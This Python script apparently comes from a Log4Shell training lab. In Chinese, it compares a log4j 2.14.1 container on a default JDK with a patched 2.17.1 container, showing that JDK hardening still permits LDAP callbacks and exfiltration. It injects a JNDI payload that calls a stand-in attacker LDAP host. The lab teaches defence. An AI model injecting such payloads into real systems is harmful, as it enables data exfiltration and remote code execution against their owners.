"""L4 · 修复对照（本关没有 flag）：两种"加固"其实不是一回事

同一个 payload、同一份应用代码，只换 JVM 参数 / log4j 版本：

  19081  2.14.1 + JDK 默认（trustURLCodebase=false）
         → LDAP 回连照样发生，但远程 class 被拒，RCE 失败
         → 也就是说：环境变量外带、DNSLog 探测这类利用依然成立

  19082  2.17.1
         → JndiLookup 不再支持 JNDI，连 lookup 都不解析，什么都不会发生

这一关要打掉一个很常见的误判："JDK 版本够新，所以 Log4Shell 对我没影响"。
新 JDK 只挡住了远程类加载这一条路，本地 gadget 链、信息外带、DoS 都还在。
真正根治是升级 log4j-core，不是升级 JDK。

跑法：python3 04_hardened.py
"""

import time

from _util import FIX, JDK, events, inject, kinds, reset, show_events

PAYLOAD = "${jndi:ldap://attacker:1389/l2}"


def probe(label, base, note):
    reset()
    print("\n── %s ─────────────────────────────────" % label)
    print("   %s" % note)
    inject(base, PAYLOAD)
    time.sleep(2.0)                       # 没回连也要给它一点时间才能下结论
    snap = events()
    print("   事件：")
    show_events(snap)
    return {
        "ldap": len(kinds(snap, "ldap_search")),
        "codebase": len(kinds(snap, "codebase")),
        "collect": len(kinds(snap, "collect")),
    }


def main():
    print("L4 · 同一个 payload：%s" % PAYLOAD)

    a = probe("19081 · 2.14.1 + JDK 默认", JDK,
              "trustURLCodebase=false，远程 codebase 被拒")
    b = probe("19082 · log4j 2.17.1", FIX,
              "JndiLookup 已移除 JNDI 能力，lookup 不解析")

    print("\n=== 对比 ===")
    print("  19081  LDAP 回连 %d 次 · class 下载 %d 次 · 代码执行回传 %d 次"
          % (a["ldap"], a["codebase"], a["collect"]))
    print("  19082  LDAP 回连 %d 次 · class 下载 %d 次 · 代码执行回传 %d 次"
          % (b["ldap"], b["codebase"], b["collect"]))

    ok = a["ldap"] > 0 and a["codebase"] == 0 and a["collect"] == 0 \
        and b["ldap"] == 0 and b["codebase"] == 0 and b["collect"] == 0
    if not ok:
        print("\n[!] 结果和预期不一致，看容器日志：docker logs log4shell-app")
        return 1

    print("\n[+] 对照成立：")
    print("    · JDK 加固只掐断了「远程类加载」这一条路，回连/外带还在")
    print("    · 升级 log4j-core 才是根治")
    print("    · 本关是认知对照，没有 flag\n")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
